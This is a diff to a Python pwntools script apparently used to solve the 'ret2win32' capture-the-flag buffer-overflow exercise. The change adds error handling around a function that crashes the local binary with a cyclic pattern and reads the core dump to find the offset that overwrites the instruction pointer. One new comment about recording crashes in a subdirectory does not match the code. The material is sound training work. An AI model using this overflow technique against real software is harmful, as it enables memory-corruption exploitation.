@@ -63,31 +63,52 @@ def find_offset(binary_path):
     # Disable logging for offset calculations
     context.log_level = 'error'
 
-    # Create an ELF object and start a new process
-    elf = context.binary = ELF(binary_path)
-    
-    # Automatically close the process when the "with" block is exited
-    with process(elf.path) as io:
+    # Record a memory crash in the Core_Dumps subdirectory
+    try:
 
-        # Send a cyclic pattern as input to the binary
-        pattern = cyclic(69)
-        io.sendline(pattern)
-        io.wait()           
+        # Create an ELF object and start a new process
+        elf = context.binary = ELF(binary_path)
+        
+        # Automatically close the process when the "with" block is exited
+        with process(elf.path) as io:
 
-        # Get the corefile to extract the value of the instruction pointer (eip)
-        core = io.corefile
-        eip = core.eip
+            # Send a cyclic pattern as input to the binary
+            pattern = cyclic(69)
+            io.sendline(pattern)
+            io.wait()           
 
-        # Find the offset by searching for the cyclic pattern in the eip value
-        offset = cyclic_find(p32(eip), n=4)
+            # Get the corefile to extract the value of the instruction pointer (eip)
+            core = io.corefile
+            eip = core.eip
 
-        # Revert the log level to the original value
-        context.log_level = log_level
+            # Find the offset by searching for the cyclic pattern in the eip value
+            offset = cyclic_find(p32(eip), n=4)
 
-    # Return the calculated offset to overwrite the instruction pointer
-    return offset
+            # Revert the log level to the original value
+            context.log_level = log_level
+
+        # Return the calculated offset to overwrite the instruction pointer
+        return offset
+
+    except FileNotFoundError as e:
+        log.error(f"Binary not found at {binary_path}")
+        raise e
+
+    except PermissionError as e:
+        log.error(f"You do not have permission to access {binary_path}")
+        raise e
+
+    except ValueError as e:
+        log.error(f"Unable to find cyclic pattern in instruction pointer")
+        raise e
+
+    except Exception as e:
+        log.error(f"An error occurred while finding offset")
+        raise e
 
 if __name__ == '__main__':
+
+    # Initiate the executables name to declare a valid filesystem path
     binary_path = './ret2win32'
     warnings.filterwarnings("ignore", category=BytesWarning)
     exploit(binary_path)
